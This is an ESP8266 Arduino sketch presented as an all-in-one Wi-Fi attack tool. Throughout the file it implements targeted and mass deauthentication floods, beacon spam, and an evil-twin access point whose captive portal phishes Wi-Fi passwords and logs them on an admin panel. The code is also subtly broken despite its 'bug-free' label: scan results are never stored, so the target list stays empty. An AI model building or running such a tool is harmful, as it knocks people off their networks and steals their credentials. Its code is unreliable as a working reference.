/*
 * GMpro87 - ALL-IN-ONE ATTACK TOOL (BUG-FREE VERSION)
 * Dev: 9u5M4n9 | Fix: DNS Redirect, Real Beacon, LittleFS Upload
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

extern "C" {
  #include "user_interface.h"
}

// --- CONFIG & VARS ---
String admin_ssid = "GMpro87";
String admin_pass = "Sangkur87";
String log_captured = "";
String current_template = "Firmware";

DNSServer dnsServer;
ESP8266WebServer server(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
};

Network networks[16];
Network target;
bool is_deauthing = false, is_eviltwin = false, is_rusuh = false, is_beacon_spam = false;
unsigned long last_action_ms = 0;
File fsUploadFile;

// --- PACKET DEAUTH ---
uint8_t deauthPkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};

// --- FIX: REAL BEACON PACKET LOGIC ---
void sendBeacon(String ssid) {
  uint8_t packet[128];
  uint8_t ssid_len = ssid.length();
  memset(packet, 0, 128);
  packet[0] = 0x80; 
  memset(&packet[4], 0xFF, 6); // Dest: Broadcast
  for(int i=10; i<22; i++) packet[i] = random(256); // Random Source & BSSID
  packet[32] = 0x64; packet[33] = 0x00; 
  packet[34] = 0x11; packet[35] = 0x04; 
  packet[36] = 0x00; packet[37] = ssid_len;
  for(int i=0; i<ssid_len; i++) packet[38+i] = ssid[i];
  uint8_t pos = 38 + ssid_len;
  packet[pos++] = 0x01; packet[pos++] = 0x08; // Supported Rates
  packet[pos++] = 0x82; packet[pos++] = 0x84; packet[pos++] = 0x8b; packet[pos++] = 0x96;
  packet[pos++] = 0x03; packet[pos++] = 0x01; packet[pos++] = random(1, 12); // Channel
  wifi_send_pkt_freedom(packet, pos, 0);
}

// --- PHISHING TEMPLATE ---
String getPhishingPage() {
  // Cek apakah ada file index.html hasil upload di LittleFS
  if (LittleFS.exists("/index.html")) {
    File f = LittleFS.open("/index.html", "r");
    String content = f.readString();
    f.close();
    return content;
  }
  // Fallback jika belum upload
  return "<html><body style='text-align:center;'><h1>System Update</h1><form action='/validate' method='POST'><input name='pass' type='password' placeholder='WiFi Password'><input type='submit'></form></body></html>";
}

// --- HANDLERS ---
void handleRoot() {
  if (is_eviltwin && WiFi.softAPSSID() == target.ssid) {
    server.send(200, "text/html", getPhishingPage());
    return;
  }

  // UI GMpro87 ASLI (Tanpa Sunat)
  String html = R"rawliteral(<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title><style>body{font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background-color:#000;color:#fff;margin:0;padding:0;user-select:none;}.header{text-align:center;padding:15px 10px;background:#050505;border-bottom:2px solid #FFC72C;}.logo-main{font-size:35px;font-weight:bold;color:#FFC72C;text-shadow:2px 2px #ff0000;margin:0;letter-spacing:2px;}.tabs{display:flex;background:#111;border-bottom:1px solid #333;position:sticky;top:0;z-index:100;overflow-x:auto;}.tab{flex:1;padding:12px 15px;text-align:center;cursor:pointer;font-weight:bold;color:#888;font-size:11px;white-space:nowrap;}.tab.active{color:#fff;background:#1a1a1a;border-bottom:3px solid #FF033E;}.container{padding:12px;}.content{display:none;}.content.active{display:block;}.table-wrapper{overflow-x:auto;border:1px solid #146dcc;border-radius:4px;margin-bottom:10px;}table{width:100%;border-collapse:collapse;}th,td{padding:8px 4px;text-align:center;border:1px solid #146dcc;font-size:11px;}th{background-color:rgba(20,109,204,0.3);color:#FFC72C;}.btn{display:block;padding:12px;border:none;border-radius:5px;color:white;font-weight:bold;cursor:pointer;font-size:11px;text-transform:uppercase;text-align:center;width:100%;box-sizing:border-box;text-decoration:none;}.btn-scan{background:#146dcc;margin-bottom:10px;}.btn-deauth{background:#FF033E;}.btn-evil{background:#A55F31;}.btn-beacon{background:#b414cc;}.btn-save{background:#0C873F;}.btn-select{background:#eb3489;padding:6px;font-size:10px;width:auto;display:inline-block;}.btn-rusuh{background:linear-gradient(45deg, #FF033E, #b414cc);}.btn-deselect{background:#444;}.action-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px;}.log-box{background:#050505;border:1px dashed #FFC72C;padding:8px;height:160px;color:#0f0;font-family:monospace;font-size:10px;overflow-y:auto;white-space:pre-wrap;}.card{background:#0a0a0a;border:1px solid #222;padding:15px;border-radius:8px;margin-bottom:12px;}h3{margin:0 0 10px 0;font-size:14px;color:#FFC72C;border-bottom:1px solid #333;}input,select{width:100%;padding:10px;margin-top:4px;background:#151515;color:#fff;border:1px solid #333;border-radius:4px;font-size:13px;box-sizing:border-box;}</style></head><body><div class="header"><h1 class="logo-main">GMpro87</h1><div class="logo-dev">dev : 9u5M4n9</div></div><div class="tabs"><div class="tab active" onclick="showTab(event,'tab-scan')">SCANNER</div><div class="tab" onclick="showTab(event,'tab-set')">SETTINGS</div><div class="tab" onclick="showTab(event,'tab-file')">ET-FILES</div><div class="tab" onclick="showTab(event,'tab-log')">PASS-LOGS</div></div><div class="container">)rawliteral";

  // TAB SCANNER
  html += "<div id='tab-scan' class='content active'><a href='/scan' class='btn btn-scan'>RE-SCAN WIFI</a><div class='table-wrapper'><table><thead><tr><th>SSID</th><th>CH</th><th>RSSI</th><th>ACT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(networks[i].ssid == "") continue;
    html += "<tr><td style='text-align:left;'>" + networks[i].ssid + "</td><td>" + String(networks[i].ch) + "</td><td>" + String(networks[i].rssi) + "</td><td><a href='/select?id=" + String(i) + "' class='btn btn-select'>SEL</a></td></tr>";
  }
  html += "</tbody></table></div><div class='action-grid'><a href='/deauth' class='btn btn-deauth'>" + String(is_deauthing ? "STOP DEAUTH" : "DEAUTH") + "</a><a href='/hotspot' class='btn btn-evil'>" + String(is_eviltwin ? "STOP EVIL" : "EVIL TWIN") + "</a><a href='/beacon' class='btn btn-beacon'>" + String(is_beacon_spam ? "STOP SPAM" : "BEACON SPAM") + "</a><a href='/rusuh' class='btn btn-rusuh' style='grid-column: span 2;'>" + String(is_rusuh ? "STOP RUSUH" : "MASS DEAUTH (RUSUH MODE)") + "</a></div></div>";

  // TAB SETTINGS
  html += "<div id='tab-set' class='content'><div class='card'><h3>Admin Config</h3><form action='/save' method='POST'><label>Admin SSID</label><input type='text' name='as' value='" + admin_ssid + "'><button type='submit' class='btn btn-save'>SAVE</button></form></div></div>";

  // TAB ET-FILES (FITUR UPLOAD AKTIF)
  html += "<div id='tab-file' class='content'><div class='card'><h3>Upload HTML Jebakan</h3><p style='font-size:10px;color:#888'>Nama file harus: index.html</p><form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='upload'><button type='submit' class='btn btn-scan' style='margin-top:10px'>UPLOAD FILE</button></form><br><a href='/clearfs' style='color:red;font-size:11px'>Hapus Semua File</a></div></div>";

  // TAB LOGS
  html += "<div id='tab-log' class='content'><div class='card'><h3>Captured Passwords</h3><div class='log-box'>" + log_captured + "</div><a href='/clear' class='btn btn-deauth'>CLEAR LOGS</a></div></div>";

  html += "</div><script>function showTab(e,t){var n,c,a;for(c=document.getElementsByClassName('content'),n=0;n<c.length;n++)c[n].classList.remove('active');for(a=document.getElementsByClassName('tab'),n=0;n<a.length;n++)a[n].classList.remove('active');document.getElementById(t).classList.add('active'),e.currentTarget.classList.add('active')}</script></body></html>";
  server.send(200, "text/html", html);
}

// --- FILE UPLOAD HANDLER ---
void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    fsUploadFile = LittleFS.open(filename, "w");
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) fsUploadFile.close();
  }
}

// --- SETUP ---
void setup() {
  LittleFS.begin();
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
  dnsServer.start(53, "*", apIP);

  server.on("/", handleRoot);
  server.on("/scan", [](){ WiFi.scanNetworks(); server.sendHeader("Location", "/"); server.send(302); });
  server.on("/select", [](){ target = networks[server.arg("id").toInt()]; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/upload", HTTP_POST, [](){ server.sendHeader("Location", "/"); server.send(302); }, handleFileUpload);
  server.on("/validate", HTTP_POST, [](){ log_captured += "[PASS] " + target.ssid + " : " + server.arg("pass") + "\n"; server.send(200, "text/html", "Success. Reconnecting..."); });
  server.on("/hotspot", [](){ 
    is_eviltwin = !is_eviltwin; 
    WiFi.softAPdisconnect(true);
    if(is_eviltwin) WiFi.softAP(target.ssid.c_str(), NULL, target.ch);
    else WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
    server.sendHeader("Location", "/"); server.send(302);
  });
  server.on("/deauth", [](){ is_deauthing = !is_deauthing; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/beacon", [](){ is_beacon_spam = !is_beacon_spam; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/rusuh", [](){ is_rusuh = !is_rusuh; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/clearfs", [](){ LittleFS.format(); server.sendHeader("Location", "/"); server.send(302); });
  
  // FIX DNS REDIRECT
  server.onNotFound([](){
    if (is_eviltwin) {
       server.sendHeader("Location", "/", true);
       server.send(302, "text/plain", "");
    } else {
       server.send(404, "text/plain", "Not Found");
    }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  unsigned long now = millis();

  if (is_deauthing && target.ssid != "" && now - last_action_ms > 150) {
    wifi_set_channel(target.ch);
    memcpy(&deauthPkt[10], target.bssid, 6);
    memcpy(&deauthPkt[16], target.bssid, 6);
    deauthPkt[0] = 0xC0; wifi_send_pkt_freedom(deauthPkt, 26, 0);
    deauthPkt[0] = 0xA0; wifi_send_pkt_freedom(deauthPkt, 26, 0);
    last_action_ms = now;
  }

  if (is_rusuh && now - last_action_ms > 100) {
    static int i = 0;
    if (networks[i].ssid != "") {
      wifi_set_channel(networks[i].ch);
      memcpy(&deauthPkt[10], networks[i].bssid, 6);
      memcpy(&deauthPkt[16], networks[i].bssid, 6);
      wifi_send_pkt_freedom(deauthPkt, 26, 0);
    }
    i = (i + 1) % 16;
    last_action_ms = now;
  }

  if (is_beacon_spam && now - last_action_ms > 100) {
    sendBeacon("HOTSPOT-GRATIS-" + String(random(10,99)));
    last_action_ms = now;
  }
}
